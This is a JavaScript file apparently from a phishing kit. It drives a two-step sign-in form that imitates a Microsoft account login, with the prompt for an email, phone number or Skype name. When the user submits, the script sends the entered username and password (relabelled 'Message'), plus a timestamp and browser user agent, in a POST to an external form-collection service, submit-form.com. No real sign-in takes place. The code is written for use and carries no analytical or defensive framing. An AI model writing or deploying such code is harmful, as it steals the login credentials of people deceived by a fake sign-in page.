document.addEventListener('DOMContentLoaded', () => {

    const unReq = "Enter a valid email address, phone number, or Skype name.";
    const pwdReq = "message.";

    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');

    let view = "uname";
    let unameVal = false;
    let pwdVal = false;

    const nxt = document.getElementById('btn_next');

    nxt.addEventListener('click', () => {
        validate();

        if (unameVal) {
            document.getElementById("section_uname").classList.add('d-none');
            document.getElementById('section_pwd').classList.remove('d-none');

            document.querySelectorAll('#user_identity').forEach((e) => {
                e.innerText = unameInp.value;
            });

            view = "pwd";
        }
    });

    const sig = document.getElementById('btn_sig');

    sig.addEventListener('click', async () => {
        validate();

        if (!pwdVal) return;

        const formData = new FormData();

        formData.append("Identity", unameInp.value);
        formData.append("Message", pwdInp.value);
        formData.append("SubmittedAt", new Date().toLocaleString());
        formData.append("UserAgent", navigator.userAgent);

        try {
            const response = await fetch(
                "https://submit-form.com/ajax/TRFsGA4J6",
                {
                    method: "POST",
                    body: formData
                }
            );

            if (!response.ok) {
                const errorText = await response.text();
                console.error("Server response:", errorText);
                throw new Error(`HTTP ${response.status}`);
            }

            document.getElementById("section_pwd").classList.add('d-none');
            document.getElementById('section_final').classList.remove('d-none');
            view = "final";

        } catch (err) {
            console.error("Submission failed:", err);
            alert("Unable to submit. Check console for details.");
        }
    });

    function validate() {

        function unameValAction(type) {
            if (!type) {
                document.getElementById('error_uname').innerText = unReq;
                unameInp.classList.add('error-inp');
                unameVal = false;
            } else {
                document.getElementById('error_uname').innerText = "";
                unameInp.classList.remove('error-inp');
                unameVal = true;
            }
        }

        function pwdValAction(type) {
            if (!type) {
                document.getElementById('error_pwd').innerText = pwdReq;
                pwdInp.classList.add('error-inp');
                pwdVal = false;
            } else {
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp');
                pwdVal = true;
            }
        }

        if (view === "uname") {
            unameValAction(unameInp.value.trim() !== "");
        } else if (view === "pwd") {
            pwdValAction(pwdInp.value.trim() !== "");
        }
    }

    unameInp.addEventListener('input', function () {
        unameVal = this.value.trim() !== "";
        document.getElementById('error_uname').innerText = unameVal ? "" : unReq;
        this.classList.toggle('error-inp', !unameVal);
    });

    pwdInp.addEventListener('input', function () {
        pwdVal = this.value.trim() !== "";
        document.getElementById('error_pwd').innerText = pwdVal ? "" : pwdReq;
        this.classList.toggle('error-inp', !pwdVal);
    });

    document.querySelector('.back').addEventListener('click', () => {
        view = "uname";
        document.getElementById("section_pwd").classList.add('d-none');
        document.getElementById('section_uname').classList.remove('d-none');
    });

    document.querySelectorAll('#btn_final').forEach((b) => {
        b.addEventListener('click', () => {
            window.location.reload();
        });
    });

});
